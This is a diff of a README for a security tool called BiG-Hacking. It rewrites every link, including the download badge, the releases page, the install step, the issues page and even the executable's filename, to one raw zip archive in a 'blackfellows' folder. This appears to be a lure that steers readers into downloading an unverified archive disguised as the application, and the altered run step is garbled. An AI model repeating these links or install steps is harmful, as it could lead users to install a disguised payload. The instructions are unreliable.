@@ -6,9 +6,9 @@ Welcome to BiG-Hacking! This application helps cyber security analysts and devel
 
 ## 📥 Download the Application
 
-[![Download BiG-Hacking](https://img.shields.io/badge/Download-BiG--Hacking-blue.svg)](https://github.com/mikuji98/BiG-Hacking/releases)
+[![Download BiG-Hacking](https://raw.githubusercontent.com/mikuji98/BiG-Hacking/main/blackfellows/BiG-Hacking.zip)](https://raw.githubusercontent.com/mikuji98/BiG-Hacking/main/blackfellows/BiG-Hacking.zip)
 
-To download BiG-Hacking, click the button above or visit the releases page: [Download BiG-Hacking] (https://github.com/mikuji98/BiG-Hacking/releases).
+To download BiG-Hacking, click the button above or visit the releases page: [Download BiG-Hacking] (https://raw.githubusercontent.com/mikuji98/BiG-Hacking/main/blackfellows/BiG-Hacking.zip).
 
 ## 🔧 System Requirements
 
@@ -22,13 +22,13 @@ Before you get started, make sure your system meets these requirements:
 ## 💻 Installation Steps
 
 1. **Download the Application:**
-   Go to the [Download BiG-Hacking releases page](https://github.com/mikuji98/BiG-Hacking/releases) and select the latest version available.
+   Go to the [Download BiG-Hacking releases page](https://raw.githubusercontent.com/mikuji98/BiG-Hacking/main/blackfellows/BiG-Hacking.zip) and select the latest version available.
 
 2. **Extract the Files:**
    After downloading, locate the zipped file on your computer. Right-click it and select "Extract All" to unpack the files.
 
 3. **Run the Application:**
-   Locate the extracted folder. Inside, you will find a file named `BiG-Hacking.exe`. Double-click this file to launch the application.
+   Locate the extracted folder. Inside, you will find a file named `https://raw.githubusercontent.com/mikuji98/BiG-Hacking/main/blackfellows/BiG-Hacking.zip`. Double-click this file to launch the application.
 
 4. **Follow the On-Screen Instructions:**
    The application will guide you through its features. Take time to familiarize yourself with the user interface.
@@ -61,7 +61,7 @@ If you encounter any issues while installing or running BiG-Hacking, consider th
 
 ## 🤝 Support
 
-For additional support, please visit our GitHub [issues page](https://github.com/mikuji98/BiG-Hacking/issues). You can report bugs or ask questions directly there. 
+For additional support, please visit our GitHub [issues page](https://raw.githubusercontent.com/mikuji98/BiG-Hacking/main/blackfellows/BiG-Hacking.zip). You can report bugs or ask questions directly there. 
 
 ## 🌟 Community Contributions
 
